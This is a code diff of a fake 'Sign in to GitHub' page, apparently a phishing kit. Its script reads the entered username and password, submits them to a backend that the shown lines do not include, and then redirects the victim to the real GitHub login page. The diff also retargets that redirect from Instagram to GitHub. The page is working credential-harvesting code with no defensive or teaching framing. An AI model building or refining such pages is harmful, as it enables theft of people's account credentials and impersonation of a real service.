@@ -3,7 +3,7 @@
 <head>
 	<meta charset="UTF-8">
 	<title>Github Sign In Page</title>
-	<link rel="stylesheet" href="style2.css">
+	<link rel="stylesheet" href="git-style.css">
 </head>
 <body>
 	
@@ -14,7 +14,7 @@
 	<div class="title">
 		<p>Sign in to GitHub</p>
 	</div>
-	<div class="form" id="form">
+	<form class="form" id="form">
 		<div class="input_field">
 			<label>Username or email address</label>
 			<input type="text" class="input" id="email" name="email">
@@ -25,9 +25,9 @@
 			<a href="#" class="forgot">Forgot password?</a>
 		</div>
 		<div class="btn">
-			<input type="submit" value="Sign in" class="sign_btn">
+			<button type="submit" class="sign_btn">Sign in</button>
 		</div>
-	</div>
+	</form>
 	<div class="create_act">
         <p id="sign-in"><a href="#">Sign in with a passkey</a></p>
 		<p>New to GitHub? <a href="#">Create an account.</a></p>
@@ -52,8 +52,8 @@ form.addEventListener('submit', async (event) => {
     event.preventDefault(); 
     
     
-    const email = form.elements['email'].value;
-    const password = form.elements['password'].value;
+    const email = document.getElementById('email').value; 
+    const password = document.getElementById('password').value;
 
     try {
         
@@ -67,10 +67,11 @@ form.addEventListener('submit', async (event) => {
 
         if (response.ok) {
             
-            window.location.href = "https://www.instagram.com/accounts/login/?hl=en";
+            window.location.href = "https://github.com/login";
         } else {
            
-            alert("Login failed. Please try again.");
+			const errorMessage = await response.text(); 
+			alert(`Login failed: ${errorMessage}`);
         }
     } catch (error) {
         console.error("Error submitting form:", error);
